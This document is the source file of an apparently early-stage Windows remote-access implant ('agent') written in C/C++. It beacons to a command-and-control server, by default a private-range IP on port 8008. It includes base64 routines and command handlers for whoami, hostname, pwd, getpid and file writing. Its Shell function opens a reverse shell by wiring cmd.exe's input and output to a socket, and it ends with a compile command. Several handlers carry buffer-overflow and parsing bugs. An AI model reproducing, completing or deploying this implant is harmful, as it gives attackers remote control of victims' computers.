// ver 0.1.1

// winapi
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

// i/o operations (printf etc.)
#include <stdio.h>

// for base64 functions
#include <stdlib.h>
#include <string.h>

/* #region Base64 functions */

size_t b64_encoded_size(size_t inlen)
{
	size_t ret;

	ret = inlen;
	if (inlen % 3 != 0)
		ret += 3 - (inlen % 3);
	ret /= 3;
	ret *= 4;

	return ret;
}

const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char *b64_encode(const unsigned char *in, size_t len)
{
	char   *out;
	size_t  elen;
	size_t  i;
	size_t  j;
	size_t  v;

	if (in == NULL || len == 0)
		return NULL;

	elen = b64_encoded_size(len);
	out  = (char *)malloc(elen+1);
	out[elen] = '\0';

	for (i=0, j=0; i<len; i+=3, j+=4) {
		v = in[i];
		v = i+1 < len ? v << 8 | in[i+1] : v << 8;
		v = i+2 < len ? v << 8 | in[i+2] : v << 8;

		out[j]   = b64chars[(v >> 18) & 0x3F];
		out[j+1] = b64chars[(v >> 12) & 0x3F];
		if (i+1 < len) {
			out[j+2] = b64chars[(v >> 6) & 0x3F];
		} else {
			out[j+2] = '=';
		}
		if (i+2 < len) {
			out[j+3] = b64chars[v & 0x3F];
		} else {
			out[j+3] = '=';
		}
	}
	return out;
}

size_t b64_decoded_size(const char *in)
{
	size_t len;
	size_t ret;
	size_t i;

	if (in == NULL)
		return 0;

	len = strlen(in);
	ret = len / 4 * 3;

	for (i=len; i-->0; ) {
		if (in[i] == '=') {
			ret--;
		} else {
			break;
		}
	}
	return ret;
}

int b64invs[80] { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
	59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
	6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
	21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
	29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
	43, 44, 45, 46, 47, 48, 49, 50, 51 };

// IF WANT TO GENERATE YOURSELF B64 DECODE TABLE
/* void b64_generate_decode_table()
{
	int    inv[80];
	size_t i;

	memset(inv, -1, sizeof(inv));
	for (i=0; i<sizeof(b64chars)-1; i++) {
		inv[b64chars[i]-43] = i;
	}
}*/

int b64_isvalidchar(char c)
{
	if (c >= '0' && c <= '9')
		return 1;
	if (c >= 'A' && c <= 'Z')
		return 1;
	if (c >= 'a' && c <= 'z')
		return 1;
	if (c == '+' || c == '/' || c == '=')
		return 1;
	return 0;
}

char* b64_decode(const char *in)
{
	size_t len;
	size_t i;
	size_t j;
	int    v;

    size_t outlen;
    outlen = b64_decoded_size(in);

    char   *out;
    out  = (char *)malloc(outlen+1);
	out[outlen] = '\0';

	if (in == NULL) {
		return 0;
    }
	len = strlen(in);

	if (outlen < b64_decoded_size(in) || len % 4 != 0) {
		return 0;
    }
	for (i=0; i<len; i++) {
		if (!b64_isvalidchar(in[i])) {
			return 0;
		}
	}

	for (i=0, j=0; i<len; i+=4, j+=3) {
		v = b64invs[in[i]-43];
		v = (v << 6) | b64invs[in[i+1]-43];
		v = in[i+2]=='=' ? v << 6 : (v << 6) | b64invs[in[i+2]-43];
		v = in[i+3]=='=' ? v << 6 : (v << 6) | b64invs[in[i+3]-43];

		out[j] = (v >> 16) & 0xFF;
		if (in[i+2] != '=')
			out[j+1] = (v >> 8) & 0xFF;
		if (in[i+3] != '=')
			out[j+2] = v & 0xFF;
	}
	return out;
}

/* Usage:
    // ENCODING WORKS AS:
    const unsigned char* test = reinterpret_cast<const unsigned char *>( "test" );
    char * out;
    out =  b64_encode(test,sizeof(test));
    //printf("%s if encoded as Base64 is: %s\n",test,out);

    // DECODING WORKS AS:
    char * test2 = "dGVzdGluZ3NvbWVsb25nc3R5bGUK";
    char * out2;
    out2 = b64_decode(test2);
    //printf("%s if decoded as Base64 is: %s\n", test2, out2);*/

/* #endregion */

/* #region Agent command functions */

DWORD getpid(){
	DWORD pid;
	pid = GetCurrentProcessId();
	return pid;
}

#define B64_FILE_ERROR          2

int upload(char * filename, char * content){
	// Upload contents to a file
	int retcode = B64_FILE_ERROR;
	FILE *outfile;
	outfile = fopen(filename, "wb");
	if (!outfile) {
		printf("[upload] [DBG] Error opening file...\n");
		return retcode;
	}
	else {
		fwrite(content,strlen(content),1,outfile);
		fclose(outfile);
		return 0;
	}
}

void whoami(char* returnval)
{
	DWORD bufferlen = 257;
	// Call WINAPI method, assign it's response to returnval pointer.
	GetUserNameA(returnval, &bufferlen);
}

void hostname(char* returnval)
{
	DWORD bufferlen = 257;
	GetComputerNameA(returnval,&bufferlen);
}

void pwd(char* returnval)
{
	char tempvar[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH,tempvar); //returns necessary value into tempvar
	strcat(returnval,tempvar); //you need to put that value into returnval
}

void Shell(char* C2Server, int C2Port)
{
	// FOR NOW IT CREATES NEW CONNECTION FOR SHELL
	// TODO : USE SAME SOCKET?

	SOCKET tcpsock;
	sockaddr_in addr;
	WSADATA version;
	// WSADATA object - contains details of application state regarding to network
	// Version comparison - whether compiled version of sockets is compatible with the older versions
	WSAStartup(MAKEWORD(2,2), &version);

	// WSASocket vs socket - same functionality, WSA.. has more options to work with.
	tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(C2Server);
	addr.sin_port = htons(C2Port);

	// This if statement triggers if connection to C&C errored out.
	if (WSAConnect(tcpsock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
		closesocket(tcpsock);
		WSACleanup();
		return;
	}
	// Else connection successfull..
	else {
		
		char RecvData[1024];
		
		memset(RecvData, 0, sizeof(RecvData));
		
		// here waits for any data input from Server
		int RecvCode = recv(tcpsock, RecvData, 1024, 0);
		
		if (RecvCode <= 0){
			closesocket(tcpsock);
			WSACleanup();
			return;
		}
		else {
			char Process[] = "cmd.exe";
			STARTUPINFOA sinfo;
			PROCESS_INFORMATION pinfo;
			memset(&sinfo, 0, sizeof(sinfo));
			
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
			
			// Socket is Handle for stdin/stdout/stderr descriptors of process
			sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcpsock;
			
			CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
			WaitForSingleObject(pinfo.hProcess, INFINITE);
			
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			
			memset(RecvData, 0, sizeof(RecvData));
			
		}
	}
}
/* #endregion */

/* #region Beacon logics */
void StartBeacon(char* C2Server, int C2Port)
{
	SOCKET tcpsock;
	sockaddr_in addr;
	WSADATA wsversion;
	// WSADATA object - contains details of application state regarding to network

	// Version comparison - whether compiled version of sockets is compatible with the older versions
	WSAStartup(MAKEWORD(2,2), &wsversion);

	// WSASocket vs socket - same functionality, WSA.. has more options to work with.
	tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(C2Server);
	addr.sin_port = htons(C2Port);

	int SOCK_STATE;
	SOCK_STATE = connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr));
	
	// This if statement performs connection and triggers if connection to C&C errored out.
	if (SOCK_STATE==SOCKET_ERROR) {
		closesocket(tcpsock);
		WSACleanup();
		return;
	}
	
	// Else connection successfull..
	else {
		while (true) {
			
			// Connection verification block START
			char RecvData[1024] = "";
			memset(RecvData, 0, sizeof(RecvData));
			// here waits for any data input from Server
			int RecvCode = recv(tcpsock, RecvData, 1024, 0);
			
			if (RecvCode <= 0){
				closesocket(tcpsock);
				WSACleanup();
				return;
			}
			// Connection verification block END
			// ------------------
			
			char * command;
			char delim[] = " ";
			command = strtok(RecvData, delim);
			printf("[beacon] [DBG] Command is %s: ", command);


			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
			if (strcmp(command, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
			else if (strcmp(command, "upload") == 0) {
				char * file = strtok(RecvData, delim);
				//char * file = "C:\\Users\\IEUser\\Desktop\\test";
				char * contents = "t3st1ng";
				printf(" [beacon] [DBG] Uploading %s into %s",contents,file);
				int result;
				result = upload(file,contents);
				
				/* #region Parse result AND send reponse */
				if (result == 0) {
					// C&C part
					char buffer[20];
					memset(buffer, 0, sizeof(buffer));
					strcat(buffer,"Uploaded ");
					strcat(buffer,file);

					send(tcpsock,buffer,strlen(buffer)+1,0);
					// clear buffers
					memset(buffer, 0, sizeof(buffer));
					memset(RecvData, 0, sizeof(RecvData)); 
				}
				else if (result == 2) {
					// C&C part
					char buffer[20];
					memset(buffer, 0, sizeof(buffer));
					strcat(buffer,"Failed to write file ");
					strcat(buffer,file);

					send(tcpsock,buffer,strlen(buffer)+1,0);
					// clear buffers
					memset(buffer, 0, sizeof(buffer));
					memset(RecvData, 0, sizeof(RecvData)); 	
				}
				/* #endregion */
			}
			else if (strcmp(command, "getpid\n") == 0) {
				DWORD pid;
				char cpid[6];
				pid = getpid();
				// Convert DWORD to char (using base 10)
				_ultoa(pid,cpid,10);
				
				// preparing buffer to send
				char buffer[20];
				memset(buffer, 0, sizeof(buffer));
				strcat(buffer,"Current PID: ");
				strcat(buffer,cpid);

				send(tcpsock,buffer,strlen(buffer)+1,0);
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			else if (strcmp(command, "whoami\n") == 0) {
				char buffer[257] = ""; // reserve buffer with length of 257 bytes
				whoami(buffer); // call whoami function
				strcat(buffer, "\n"); 
				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
			else if (strcmp(command, "pwd\n") == 0) {
				char buffer[257] = "";
				pwd(buffer);
				strcat(buffer, "\n"); 
				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			else if (strcmp(command, "hostname\n") == 0) {
				char buffer[257] = "";
				hostname(buffer);
				strcat(buffer, "\n"); 
				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			else if (strcmp(command, "shell\n") == 0) {
				Shell(C2Server,C2Port);
			}
			else if (strcmp(command, "exit\n") == 0) {
				closesocket(tcpsock);
				WSACleanup();
				Sleep(1000);
				return;
			}
			else if (strcmp(command, "kill\n") == 0) {
				closesocket(tcpsock);
				WSACleanup();
				Sleep(1000);
				exit(0);
			}
			else {
				char buffer[20] = "Invalid command\n";
				send(tcpsock,buffer,strlen(buffer)+1,0);
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			memset(RecvData, 0, sizeof(RecvData));
		}
	}
	closesocket(tcpsock);
	WSACleanup();
	exit(0);
}
/* #endregion */

int main(int argc, char **argv)
{
	// Window handle to work with Console window;
	HWND stealth;
	AllocConsole();

	// Idea of searching window and saying to show it (SW_HIDE to hide)
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_SHOWNORMAL);

	if (argc == 3)
	{
		int port = atoi(argv[2]);
		while (true) {
				// BEACONING
				// NEED TO IMPLEMENT RANDOM DELAY
				Sleep(1000); // 1000 ms = 1s

				StartBeacon(argv[1],port);
		}
	} else {
		char host[] = "192.168.56.112";
		int port = 8008;
			while (true) {
				// BEACONING
				// NEED TO IMPLEMENT RANDOM DELAY
				Sleep(1000); // 1000 ms = 1s

				StartBeacon(host,port);
		}
	}
	return 0;
}
// Compile:
// i686-w64-mingw32-g++ -std=c++11 -o agent.exe agent-dev.cpp -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
